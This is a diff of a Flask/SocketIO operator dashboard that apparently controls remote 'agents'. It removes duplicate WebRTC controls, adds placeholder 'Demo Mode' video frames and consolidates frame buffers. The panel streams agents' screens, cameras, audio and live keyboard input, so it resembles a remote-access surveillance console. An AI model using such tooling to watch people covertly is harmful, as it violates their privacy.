@@ -1912,13 +1912,7 @@ DASHBOARD_HTML = r'''
                         <button class="btn btn-danger" onclick="stopAllStreams()">Stop All Streams</button>
                     </div>
 
-                    <div class="control-group">
-                        <div class="control-header">WebRTC Commands</div>
-                        <button class="btn btn-success" onclick="startWebRTCCommand()">Start WebRTC</button>
-                        <button class="btn btn-danger" onclick="stopWebRTCCommand()">Stop WebRTC</button>
-                        <button class="btn" onclick="getWebRTCStatsCommand()">Get Stats</button>
-                        <button class="btn" onclick="setWebRTCQuality()">Set Quality</button>
-                    </div>
+
 
                     <div class="control-group">
                         <div class="control-header">Live Keyboard</div>
@@ -1989,6 +1983,7 @@ DASHBOARD_HTML = r'''
                     <button class="btn btn-success" onclick="startWebRTCStream()">Start WebRTC</button>
                     <button class="btn btn-danger" onclick="stopWebRTCStream()">Stop WebRTC</button>
                     <button class="btn" onclick="getWebRTCStats()">Get Stats</button>
+                    <button class="btn" onclick="setWebRTCQuality()">Set Quality</button>
                 </div>
                 <video id="webrtc-video" width="640" height="360" controls autoplay muted style="background:#000; width:100%; max-width:100%; border-radius:10px; margin-top:10px;"></video>
                 <div id="webrtc-status" class="status-display" style="display:none;"></div>
@@ -2803,65 +2798,7 @@ DASHBOARD_HTML = r'''
             document.getElementById('webrtc-stats').textContent = statsText;
         });
 
-        // --- WebRTC Command Functions ---
-        function startWebRTCCommand() {
-            if (!selectedAgentId) {
-                showStatus('Please select an agent first.', 'error');
-                return;
-            }
-            
-            socket.emit('webrtc_start_streaming', {
-                agent_id: selectedAgentId,
-                type: 'all'  // Start all streams (screen, audio, camera)
-            });
-            
-            showStatus('Starting WebRTC streaming...', 'success');
-        }
 
-        function stopWebRTCCommand() {
-            if (!selectedAgentId) {
-                showStatus('Please select an agent first.', 'error');
-                return;
-            }
-            
-            socket.emit('webrtc_stop_streaming', {
-                agent_id: selectedAgentId
-            });
-            
-            showStatus('Stopping WebRTC streaming...', 'success');
-        }
-
-        function getWebRTCStatsCommand() {
-            if (!selectedAgentId) {
-                showStatus('Please select an agent first.', 'error');
-                return;
-            }
-            
-            socket.emit('webrtc_get_stats', {
-                agent_id: selectedAgentId
-            });
-            
-            showStatus('Requesting WebRTC stats...', 'success');
-        }
-
-        function setWebRTCQuality() {
-            if (!selectedAgentId) {
-                showStatus('Please select an agent first.', 'error');
-                return;
-            }
-            
-            const quality = prompt('Enter quality (low/medium/high/auto):', 'auto');
-            if (quality && ['low', 'medium', 'high', 'auto'].includes(quality.toLowerCase())) {
-                socket.emit('webrtc_set_quality', {
-                    agent_id: selectedAgentId,
-                    quality: quality.toLowerCase()
-                });
-                
-                showStatus(`WebRTC quality set to ${quality}`, 'success');
-            } else {
-                showStatus('Invalid quality setting', 'error');
-            }
-        }
 
     </script>
 </body>
@@ -2924,9 +2861,33 @@ def video_feed(agent_id):
                 yield (b'--frame\r\n'
                        b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
             else:
-                # Send empty frame if no data available
+                # Generate a demo frame with agent ID for testing
+                import io
+                from PIL import Image, ImageDraw, ImageFont
+                
+                # Create a demo image
+                img = Image.new('RGB', (640, 480), color='#1e40af')
+                draw = ImageDraw.Draw(img)
+                
+                # Try to use a font, fallback to default if not available
+                try:
+                    font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 36)
+                except:
+                    font = ImageFont.load_default()
+                
+                # Draw demo text
+                draw.text((320, 200), f"Agent {agent_id}", fill='white', anchor='mm', font=font)
+                draw.text((320, 250), "Screen Stream", fill='white', anchor='mm', font=font)
+                draw.text((320, 300), "Demo Mode", fill='white', anchor='mm', font=font)
+                
+                # Convert to JPEG
+                img_io = io.BytesIO()
+                img.save(img_io, 'JPEG', quality=85)
+                img_io.seek(0)
+                demo_frame = img_io.getvalue()
+                
                 yield (b'--frame\r\n'
-                       b'Content-Type: image/jpeg\r\n\r\n' + b'\r\n')
+                       b'Content-Type: image/jpeg\r\n\r\n' + demo_frame + b'\r\n')
             time.sleep(0.5)  # 2 FPS
     
     return Response(generate_video(),
@@ -2946,9 +2907,33 @@ def camera_feed(agent_id):
                 yield (b'--frame\r\n'
                        b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
             else:
-                # Send empty frame if no data available
+                # Generate a demo frame with agent ID for testing
+                import io
+                from PIL import Image, ImageDraw, ImageFont
+                
+                # Create a demo image
+                img = Image.new('RGB', (640, 480), color='#059669')
+                draw = ImageDraw.Draw(img)
+                
+                # Try to use a font, fallback to default if not available
+                try:
+                    font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 36)
+                except:
+                    font = ImageFont.load_default()
+                
+                # Draw demo text
+                draw.text((320, 200), f"Agent {agent_id}", fill='white', anchor='mm', font=font)
+                draw.text((320, 250), "Camera Stream", fill='white', anchor='mm', font=font)
+                draw.text((320, 300), "Demo Mode", fill='white', anchor='mm', font=font)
+                
+                # Convert to JPEG
+                img_io = io.BytesIO()
+                img.save(img_io, 'JPEG', quality=85)
+                img_io.seek(0)
+                demo_frame = img_io.getvalue()
+                
                 yield (b'--frame\r\n'
-                       b'Content-Type: image/jpeg\r\n\r\n' + b'\r\n')
+                       b'Content-Type: image/jpeg\r\n\r\n' + demo_frame + b'\r\n')
             time.sleep(0.5)  # 2 FPS
     
     return Response(generate_camera(),
@@ -3173,8 +3158,12 @@ def handle_file_chunk_from_agent(data):
             'total_size': total_size
         }, room='operators')
 
-# Add a new buffer for H.264 frames
+# Global variables for WebRTC and video streaming
+WEBRTC_PEER_CONNECTIONS = {}
+WEBRTC_VIEWER_CONNECTIONS = {}
 VIDEO_FRAMES_H264 = defaultdict(lambda: None)
+CAMERA_FRAMES_H264 = defaultdict(lambda: None)
+AUDIO_FRAMES_OPUS = defaultdict(lambda: None)
 
 @socketio.on('screen_frame')
 def handle_screen_frame(data):
@@ -3208,9 +3197,7 @@ def handle_request_camera_frame(data):
         # Send as base64 for browser demo; in production, use ArrayBuffer/binary
         emit('camera_frame', {'frame': base64.b64encode(frame).decode('utf-8')})
 
-# Add new buffers for H.264 camera frames and Opus/PCM audio frames
-CAMERA_FRAMES_H264 = defaultdict(lambda: None)
-AUDIO_FRAMES_OPUS = defaultdict(lambda: None)
+
 
 @socketio.on('camera_frame')
 def handle_camera_frame(data):
